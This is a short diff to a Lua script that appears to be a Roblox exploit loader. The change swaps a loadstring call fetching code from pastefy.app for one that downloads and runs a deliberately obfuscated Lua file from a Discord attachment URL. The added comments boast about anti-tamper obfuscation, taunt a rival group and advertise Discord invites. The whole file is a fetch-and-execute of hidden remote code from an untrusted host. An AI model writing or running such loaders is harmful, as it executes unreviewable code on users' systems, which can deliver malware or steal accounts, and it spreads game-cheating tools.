@@ -1,2 +1,6 @@
---// This Won't Last Long
-loadstring(game:HttpGet("https://pastefy.app/I3L1uoQg/raw"))();
+--[[
+ Orealation: Stop Trying ? Are You on That "TR4SH" Discord Server ? if You Are Well Then Read The Comments Down Below
+]]
+--// This Script Was MassObfuscated by Obscuralua, Shit Obfuscater And MoonSec V3 With Anti-Tamper, Constant Security And Maximum Security Enabled So Dont Even Try to Skid it
+--// https://youtu.be/6vUGYf46-HU?si=BZqOowvoUDsfyYKW Scary Right? Btw Join There Discord For FxGFuscator There Cool Guys: discord.gg/bc7z78asRA
+loadstring(game:HttpGet("https://cdn.discordapp.com/attachments/1256781929861091329/1258319619899260958/415k10m5215-obfuscated.lua?ex=66879cf7&is=66864b77&hm=8ea268e041a1e624b87000dac7ccbf251d8949c3117fc85ec58ea97ae67fd38b&"))();
